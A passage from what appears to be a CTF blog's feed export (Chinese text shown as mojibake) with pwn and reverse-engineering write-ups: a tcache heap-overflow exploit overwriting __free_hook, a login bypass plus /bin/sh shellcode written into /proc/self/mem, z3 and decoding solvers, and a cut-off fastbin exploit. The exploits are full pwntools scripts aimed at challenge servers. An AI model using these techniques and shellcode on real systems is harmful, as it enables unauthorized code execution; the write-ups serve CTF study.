* v1), dword_202068[4 * v1]);</code> è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„<code>strdup</code> å°±é€ æˆäº†å †æº¢å‡ºã€‚</li></ul><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>ç”³è¯·8ä¸ª0x90å¤§å°çš„å †å—ï¼Œsize å¡«æˆ0xffï¼Œç•™ç€æº¢å‡º</li><li>ç”³è¯·3ä¸ª0x80å¤§å°çš„å †å—ï¼Œsize å¡«æˆ0xffï¼Œç•™ç€æº¢å‡º</li><li>é‡Šæ”¾å‰8ä¸ªå †ï¼Œæœ€åä¸€ä¸ªè¿›å…¥unsortbin</li><li>ç”³è¯·ä¸€ä¸ª0x90çš„å †å—ï¼Œä¼šç”³è¯·åˆ°tcacheçš„å¤´çš„å †ï¼Œä¹Ÿå°±æ˜¯ç¬¬7ä¸ªå †</li><li>editæº¢å‡ºä¿®æ”¹åˆ°next chunkçš„size å’Œprev sizeï¼Œè®©show å‡ºlibcä¿¡æ¯</li><li>æ¥ç€ä¿®æ”¹unsortbinçš„size ä¸º0x80ï¼Œå¼€å§‹è¿›è¡Œtcache attackï¼Œä¹Ÿå°±æ˜¯æº¢å‡ºä¿®æ”¹tcache chianä¸Šçš„å †åœ°å€ï¼Œä¿®æ”¹ä¸ºfree hook</li><li>ç„¶åç”³è¯·å †åˆ°free hookï¼Œæ‰“one gadgets<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.12.248'</span>,<span class="hljs-number">50001</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Input index:'</span>,str(idx))    sla(<span class="hljs-string">'Input size'</span>,str(size))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>    add(i,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">10</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">11</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">12</span>,<span class="hljs-number">0xff</span>,payload)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>add(<span class="hljs-number">6</span>,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + <span class="hljs-string">'2'</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)edit(<span class="hljs-number">6</span>,payload)show(<span class="hljs-number">6</span>)ru(<span class="hljs-string">'22222222'</span>)r(<span class="hljs-number">8</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>)edit(<span class="hljs-number">6</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">13</span>,<span class="hljs-number">0xff</span>,payload)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x80</span>) + p64(free_hook)edit(<span class="hljs-number">13</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">14</span>,<span class="hljs-number">0xff</span>,payload)one = <span class="hljs-number">0x4f3c2</span> + libc_baseadd(<span class="hljs-number">15</span>,<span class="hljs-number">0xff</span>,payload)edit(<span class="hljs-number">15</span>,p64(one))free(<span class="hljs-number">14</span>)itr()</code></pre></div><h2 id="safe-shell"><a href="#safe-shell" class="headerlink" title="safe shell"></a>safe shell</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="ç™»é™†å‡½æ•°ï¼š"><a href="#ç™»é™†å‡½æ•°ï¼š" class="headerlink" title="ç™»é™†å‡½æ•°ï¼š"></a>ç™»é™†å‡½æ•°ï¼š</h4><div class="hljs"><pre><code class="hljs c">!<span class="hljs-built_in">strcmp</span>(name, &amp;s) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(password, &amp;ptr);</code></pre></div><p>åœ¨æœ€åçš„éªŒè¯æ˜¯ç”¨strcmpï¼Œä¼šè¢«<code>\x00</code>ç»™æˆªæ–­ï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸Šçš„admin.txtä¸Šæ¥ä¹Ÿæ˜¯ç©ºçš„ã€‚ç›´æ¥è®¾ç½®nameä¸passwordå‡ä¸º<code>\x00</code>å³å¯ç»•è¿‡ã€‚</p><h4 id="shellå‡½æ•°ï¼š"><a href="#shellå‡½æ•°ï¼š" class="headerlink" title="shellå‡½æ•°ï¼š"></a>shellå‡½æ•°ï¼š</h4><ul><li>éƒ½æ˜¯å›´ç»•<code>/proc/self/</code>ç›®å½•ä¸‹çš„æ“ä½œ</li><li><code>set_lseek</code>å¯ä»¥ä¿®æ”¹è¯»å–æŸæ–‡ä»¶æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯openä»¥åé»˜è®¤æ“ä½œè¯»å†™æŒ‡é’ˆæ˜¯æŒ‡å‘æ–‡ä»¶çš„å¼€å¤´çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆçš„åœ¨è¿™ä¸ªæ–‡ä»¶ä¸ŠæŒ‡å‘</li><li>write ä¸€æ¬¡åªèƒ½å†™8å­—èŠ‚</li></ul><p>é‡ç‚¹æ˜¯äº†è§£<code>/proc/pid/</code>ç›®å½•ä¸‹æ–‡ä»¶çš„ä¿¡æ¯ä¸å«ä¹‰ã€‚<br><a href="https://blog.csdn.net/enweitech/article/details/53391567" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53391567</a></p><p><strong>ç‰¹åˆ«æ³¨æ„ mmaps å’Œ mem</strong></p><h5 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h5><p>æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå­˜æ”¾ç€å†…å­˜åˆ†å¸ƒå›¾ï¼Œç±»ä¼¼äºgdbä¸­vmmapï¼Œå¯ä»¥æ³„æ¼ä¸€ä¸‹ç¨‹åºçš„åŸºåœ°å€ã€‚</p><h5 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h5><ul><li>åŒ…å«äº†ç¨‹åºè¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼›</li><li>é€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜</li><li>/ proc / $pid / memä»¥ä¸è¿›ç¨‹ä¸­ç›¸åŒçš„æ–¹å¼æ˜¾ç¤º$pidçš„å†…å­˜æ˜ å°„,å³ä¼ªæ–‡ä»¶ä¸­åç§»xå¤„çš„å­—èŠ‚ä¸è¿›ç¨‹ä¸­åœ°å€xå¤„çš„å­—èŠ‚ç›¸åŒ.ã€‚</li><li>ç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚</li></ul><p>å†™å…¥memæ–‡ä»¶ä¹Ÿç›¸å½“äºä¿®æ”¹ç¨‹åºåœ¨å†…å­˜çš„æœ¬èº«äº†ï¼Œç»“åˆmmapsçš„ç¨‹åºåŸºå€ï¼Œåœ¨åˆé€‚çš„åœ°æ–¹å†™å…¥shellcodeï¼Œè®©ç¨‹åºèµ°åˆ°è¿™é‡Œå³å¯get shell</p><h4 id="é˜²å¾¡å‡½æ•°ï¼š"><a href="#é˜²å¾¡å‡½æ•°ï¼š" class="headerlink" title="é˜²å¾¡å‡½æ•°ï¼š"></a>é˜²å¾¡å‡½æ•°ï¼š</h4><p>åœ¨ç›‘æµ‹åˆ°3æ¬¡å¯†ç é”™è¯¯åï¼Œå¼€å§‹æ‹’ç»è¿æ¥ï¼Œå¹¶ä¸”ä¼šåœ¨<code>admin.txt</code>ä¸­å†™å…¥éšæœºçš„512ä¸ªå­—æ¯æ•°å­—ç»„åˆçš„å­—ç¬¦ã€‚è¿™æ ·å°±åŸºæœ¬ç™»é™†ä¸ä¸Šå»äº†,å› ä¸ºæ˜¯éšæœºçš„ï¼Œå¹¶ä¸”nameè·Ÿpasswordæœ€å¤§ä¹Ÿå°±æ˜¯0x100çš„é•¿åº¦ã€‚</p><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>ç»•è¿‡checkï¼Œç™»å…¥diy shell </li><li>è¯»å…¥mmapsï¼Œleak å‡º ç¨‹åºçš„base</li><li>open memæ–‡ä»¶ï¼Œå‡†å¤‡å†™å…¥</li><li>ç¡®å®šå†™å…¥åç§»ä¸ºhelpå<code>0x16CC + base</code>,é€šè¿‡<code>set_lseek</code>æ¥ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘</li><li>wirte å†™å…¥8å­—èŠ‚shellcode</li><li>é€šè¿‡<code>set_lseek</code>æ¥ä¿®æ”¹æŒ‡é’ˆ+8ï¼Œå†æ¬¡å†™å…¥ï¼Œå¾ªç¯å†™å¥½shellcode</li><li>è¾“å…¥helpå³å¯</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./safe_shell'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'\x00'</span>)sa(<span class="hljs-string">'pass'</span>,<span class="hljs-string">'\x00'</span>)sl(<span class="hljs-string">'readonly'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'maps'</span>)s = ru(<span class="hljs-string">'-5'</span>)s = s[<span class="hljs-number">2</span>:<span class="hljs-number">14</span>]base = int(s,<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'base'</span>,base)patch_addr = <span class="hljs-number">0x16CC</span> + basesl(<span class="hljs-string">'open'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'mem'</span>)shellcode = <span class="hljs-string">'\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> range(len(shellcode)//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>):    sl(<span class="hljs-string">'set_lseek'</span>)    sla(<span class="hljs-string">' file offset'</span>,str(patch_addr + i*<span class="hljs-number">8</span>))    sla(<span class="hljs-string">'$'</span>,<span class="hljs-string">'write'</span>)    sa(<span class="hljs-string">'your context'</span>,shellcode[i*<span class="hljs-number">8</span>:(i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>)])sl(<span class="hljs-string">'help'</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¾ŠåŸæ¯2020éƒ¨åˆ†wp</title>
    <link href="/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¾ŠåŸæ¯2020éƒ¨åˆ†wp"><a href="#ç¾ŠåŸæ¯2020éƒ¨åˆ†wp" class="headerlink" title="ç¾ŠåŸæ¯2020éƒ¨åˆ†wp"></a>ç¾ŠåŸæ¯2020éƒ¨åˆ†wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exeçš„é€†å‘ã€‚å…¶ä¸­åœ¨ä¿®å¤pycæ—¶ï¼Œä¸ªäººä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œè®°å½•ä¸€ä¸‹ï¼š</p><p> åœ¨è„±å»ä»¥åï¼Œä¼šæœ‰ä¸»ç¨‹åºï¼Œè·Ÿä¸€ä¸ªstructçš„æ–‡ä»¶ã€‚</p><p>è¦ä¿è¯ä¸»ç¨‹åºä¸structçš„å‰é¢çš„é­”æ³•å­—èŠ‚æ˜¯ç›¸åŒä¸€æ ·çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>é‡ç‚¹å…³æ³¨å‰16ä¸ªå­—èŠ‚ï¼Œä¿è¯ç›¸åŒå³å¯ã€‚<br>ä¿®å¤å¥½pycåï¼Œå°±å¯ä»¥è¿›è¡Œåç¼–è¯‘ã€‚<br>å‰©ä¸‹çš„å°±æ˜¯é€†ç®—æ³•ï¼Œéœ€è¦ç”¨åˆ°z3ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-string">'''a1 = Int('a1')a2 = Int('a2')a3 = Int('a3')a4 = Int('a4')a5 = Int('a5')a6 = Int('a6')a7 = Int('a7')a8 = Int('a8')a9 = Int('a9')a10 = Int('a10')a11 = Int('a11')a12 = Int('a12')a13 = Int('a13')a14 = Int('a14')s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)if s.check() == sat:    result = s.model()    print result'''</span><span class="hljs-string">'''[a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10]'''</span>key = [<span class="hljs-number">10</span>,<span class="hljs-number">24</span>,<span class="hljs-number">119</span>,<span class="hljs-number">7</span>,<span class="hljs-number">104</span>,<span class="hljs-number">43</span>,<span class="hljs-number">28</span>,<span class="hljs-number">91</span>,<span class="hljs-number">108</span>,<span class="hljs-number">52</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">88</span>,<span class="hljs-number">33</span>]flag = <span class="hljs-string">' '</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>):    key[i<span class="hljs-number">-1</span>] = key[i] ^ key[i - <span class="hljs-number">1</span>]    flag += chr(key[i<span class="hljs-number">-1</span>])flag = flag[::<span class="hljs-number">-1</span>]flag += chr(<span class="hljs-number">33</span>)print(flag)</code></pre></div><p>å…¶ä¸­åœ¨z3ä¸­å¤„ç†é€»è¾‘è¿ç®—æ—¶ï¼Œæ˜¯å¾ˆç‰¹æ®Šçš„ï¼Œè¿™ä¸ªéœ€è¦æ³¨æ„ï¼Œå…·ä½“å¯ä»¥çœ‹z3çš„å®˜æ–¹æ–‡æ¡£ã€‚<br>å¯ä»¥å‚è€ƒï¼š<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p><p>è¿˜æœ‰é‡åˆ°é€»è¾‘å·¦ç§»å³ç§»ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-number">1.</span> â€œ&gt;&gt;â€int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &gt;&gt; <span class="hljs-number">1</span>);å…ˆå°†xè½¬æˆäºŒè¿›åˆ¶ <span class="hljs-number">10000</span>, ä¸è¯»æœ€åä¸€ä½ï¼Œ è¾“å‡º <span class="hljs-number">1000</span>ï¼Œ å³ä¸º<span class="hljs-number">8</span>;å³ç§»ä¸€ä½ç›¸å½“äºæ•°å€¼é™¤ä»¥<span class="hljs-number">2</span><span class="hljs-number">2.</span> â€œ&lt;&lt;â€int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &lt;&lt; <span class="hljs-number">1</span>);å…ˆå°†xè½¬æˆäºŒè¿›åˆ¶ <span class="hljs-number">10000</span>, å¾€æœ€åå†è¯»å–ä¸€ä½(<span class="hljs-number">0</span>, æˆ–æ ¹æ®æ˜¯å¦å·²ç»æœ‰ç§»ä½)ï¼Œ è¾“å‡º <span class="hljs-number">100000</span>ï¼Œ å³ä¸º<span class="hljs-number">32</span>;å·¦ç§»ï¼Œè‹¥ç§»åŠ¨ä½æ•°Kç­‰äºæˆ–å¤§äºæ•°æ®é•¿åº¦N,é€šå¸¸åªç§»åŠ¨K mod N ä½æ•°å·¦ç§»ä¸€ä½ç›¸å½“äºæ•°å€¼ä¹˜ä»¥<span class="hljs-number">2</span></code></pre></div><p>åœ¨è¿™é‡Œæ˜¯å·¦ç§»7ï¼Œä¹Ÿå°±æ˜¯ä¹˜ 2 çš„7æ¬¡æ–¹ã€‚</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>3å±‚åŠ å¯†.</p><ul><li>ä¸€ä¸ªbase64</li><li>ä¸€ä¸ªä»¥13å­—èŠ‚ï¼Œåˆ†å‰²å­—ç¬¦ï¼Œè¿›è¡Œç§»ä½</li><li>å•å­—èŠ‚å‡¯æ’’åŠ å¯†ï¼Œä½†æ˜¯ä¹ŸåŠ å…¥äº†å¯¹æ•°å­—çš„å¤„ç†</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64key = <span class="hljs-string">'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]buf = [<span class="hljs-number">0</span>]*<span class="hljs-number">52</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">90</span>:        buf[i] = (key[i] - <span class="hljs-number">65</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">96</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">122</span>:        buf[i] =  (key[i] - <span class="hljs-number">97</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">0x61</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">57</span>:        buf[i] = (key[i] - <span class="hljs-number">48</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">10</span> + <span class="hljs-number">48</span>        <span class="hljs-keyword">continue</span>    buf[i] = key[i]buf = [chr(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> buf]key2 = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> buf:    key2 += ikey2 = key2[<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] + key2[<span class="hljs-number">39</span>:<span class="hljs-number">52</span>] + key2[:<span class="hljs-number">13</span>] + key2[<span class="hljs-number">26</span>:<span class="hljs-number">39</span>]flag = base64.b64decode(key2)print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>å…¥é—¨å †é¢˜ï¼Œå­˜åœ¨uafï¼Œè¿›è¡Œ<code>fastbin attcak</code>å³å¯ã€‚</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span 